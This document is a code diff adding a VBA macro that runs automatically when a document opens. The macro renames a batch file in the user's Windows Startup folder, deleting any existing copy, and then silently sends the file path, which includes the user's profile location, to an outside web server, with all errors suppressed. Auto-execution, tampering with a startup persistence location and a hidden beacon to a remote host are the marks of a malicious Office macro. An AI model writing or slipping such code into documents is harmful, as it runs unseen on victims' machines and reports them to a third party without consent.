@@ -1,0 +1,44 @@
+Sub RenameApiResponse()
+    Dim folderPath As String, oldPath As String, newPath As String
+
+    folderPath = Environ("APPDATA") & _
+                 "\Microsoft\Windows\Start Menu\Programs\Startup\"
+
+    oldPath = folderPath & "api_response.bat"
+    newPath = folderPath & "api_response_saved.bat"
+
+    If Dir(oldPath) <> "" Then
+        If Dir(newPath) <> "" Then Kill newPath
+        Name oldPath As newPath
+        SendRenameAck "renamed", newPath
+    Else
+        SendRenameAck "file_missing", oldPath
+    End If
+End Sub
+
+Private Sub SendRenameAck(ByVal statusText As String, ByVal filePath As String)
+    Dim ackHttp As Object
+    Dim ackUrl As String
+    Dim payload As String
+
+    ackUrl = "https://macro-data-server.onrender.com/ack"
+
+    payload = "{""status"":""" & statusText & """,""file"":""" _
+              & Replace(filePath, "\", "\\") & """}"
+
+    On Error Resume Next
+    Set ackHttp = CreateObject("MSXML2.XMLHTTP")
+    If ackHttp Is Nothing Then
+        Set ackHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    End If
+    If ackHttp Is Nothing Then Exit Sub
+
+    ackHttp.Open "POST", ackUrl, False
+    ackHttp.setRequestHeader "Content-Type", "application/json"
+    ackHttp.send payload
+    On Error GoTo 0
+End Sub
+
+Sub AutoOpen()
+    RenameApiResponse
+End Sub
